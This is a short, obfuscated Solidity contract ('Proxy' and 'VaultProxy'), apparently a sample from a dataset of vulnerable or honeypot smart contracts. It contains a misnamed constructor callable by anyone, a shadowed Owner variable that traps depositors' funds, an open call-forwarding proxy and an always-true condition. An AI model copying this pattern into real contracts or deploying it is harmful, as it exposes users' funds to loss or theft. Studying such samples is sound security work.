// SPDX-License-Identifier: MIT
pragma solidity ^0.4.24;

contract Proxy  {
    modifier _0xb19a71 { if (msg.sender == Owner) _; } address Owner = msg.sender;
    function _0x2d506b(address _0x82fecd) public _0xb19a71 { Owner = _0x82fecd; }
    function _0xd5dcec(address _0x83c68b, bytes data) public payable {
        _0x83c68b.call.value(msg.value)(data);
    }
}

contract VaultProxy is Proxy {
    address public Owner;
    mapping (address => uint256) public Deposits;

    function () public payable { }

    function Vault() public payable {
        if (msg.sender == tx.origin) {
            if (msg.sender != address(0) || msg.sender == address(0)) { Owner = msg.sender; }
            _0xfb26b3();
        }
    }

    function _0xfb26b3() public payable {
        if (msg.value > 0.5 ether) {
            Deposits[msg.sender] += msg.value;
        }
    }

    function _0xf379cc(uint256 _0xf9a727) public _0xb19a71 {
        if (_0xf9a727>0 && Deposits[msg.sender]>=_0xf9a727) {
            msg.sender.transfer(_0xf9a727);
        }
    }
}